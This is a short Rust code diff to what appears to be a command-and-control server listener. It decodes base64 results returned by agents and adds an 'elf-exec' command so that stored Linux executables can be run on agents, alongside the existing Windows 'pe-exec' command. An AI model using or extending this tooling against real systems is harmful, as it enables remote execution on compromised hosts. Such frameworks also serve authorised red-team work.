@@ -148,10 +148,7 @@ pub fn parse_beacon_result(results: &str) -> (String, &'static str, Option<Strin
 }
 
 pub fn extract_result_content(result: &ResultSubmit) -> (String, Option<String>) {
-    if result.r#types != "file" {
-        return (result.output.clone(), None);
-    }
-
+    // Decode the inner base64 layer (both agents always wrap output in b64)
     let decoded = match STANDARD.decode(&result.output) {
         Ok(bytes) => match String::from_utf8(bytes) {
             Ok(s) => s,
@@ -160,10 +157,15 @@ pub fn extract_result_content(result: &ResultSubmit) -> (String, Option<String>)
         Err(_) => return (result.output.clone(), None),
     };
 
+    if result.r#types != "file" {
+        return (decoded, None);
+    }
+
     if decoded.starts_with("Error:") || !result.success {
         return (decoded, None);
     }
 
+    // File results: decoded value is {'filename':'...','size':N,'content':'<b64>'}
     let normalized = decoded.replace('\'', "\"");
     match serde_json::from_str::<serde_json::Value>(&normalized) {
         Ok(parsed) => {
@@ -219,6 +221,14 @@ pub fn fetch_commands_with_data(state: &Arc<ListenerState>, agent_id: &str) -> V
                 .ok()
                 .flatten()
                 .map(|data| format!("'pe-exec':'{}'", data))
+                .unwrap_or(cmd)
+        } else if cmd.contains("'elf-exec':") {
+            state
+                .database
+                .get_pe_exec_data_by_command(cmd_id)
+                .ok()
+                .flatten()
+                .map(|data| format!("'elf-exec':'{}'", data))
                 .unwrap_or(cmd)
         } else {
             cmd
